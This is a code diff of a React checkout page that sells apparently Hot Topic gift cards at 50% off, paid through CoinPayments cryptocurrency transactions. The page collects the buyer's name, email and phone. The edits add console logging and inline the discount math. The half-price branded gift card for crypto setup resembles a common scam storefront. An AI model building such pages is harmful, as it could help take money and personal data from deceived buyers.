@@ -142,12 +142,11 @@ const Index = () => {
     setIsSubmitting(true);
     
     try {
-      // Calculate the discounted amount (50% of the selected gift card value)
-      const paymentAmount = selectedAmount * 0.5;
+      console.log(`Starting payment process for $${selectedAmount} gift card (50% off)`);
       
-      // Create CoinPayment transaction
+      // Create CoinPayment transaction with 50% of the selected gift card value
       const paymentResult = await createCoinPaymentTransaction({
-        amount: paymentAmount,
+        amount: selectedAmount * 0.5,
         customerName: `${formData.firstName} ${formData.lastName}`,
         customerEmail: formData.email,
         giftCardValue: selectedAmount,
@@ -159,9 +158,12 @@ const Index = () => {
           description: paymentResult.error || "There was an error processing your payment",
           variant: "destructive",
         });
+        console.error("Payment creation failed:", paymentResult.error);
         setIsSubmitting(false);
         return;
       }
+      
+      console.log("Payment transaction created successfully, redirecting to:", paymentResult.checkoutUrl);
       
       // Save order details to localStorage for reference
       localStorage.setItem("hotTopicOrder", JSON.stringify({
@@ -169,7 +171,7 @@ const Index = () => {
         email: formData.email,
         phone: formData.phone,
         giftCardValue: selectedAmount,
-        paymentAmount: paymentAmount,
+        paymentAmount: selectedAmount * 0.5,
         deliveryMethod: deliveryMethod,
         orderDate: new Date().toISOString(),
       }));
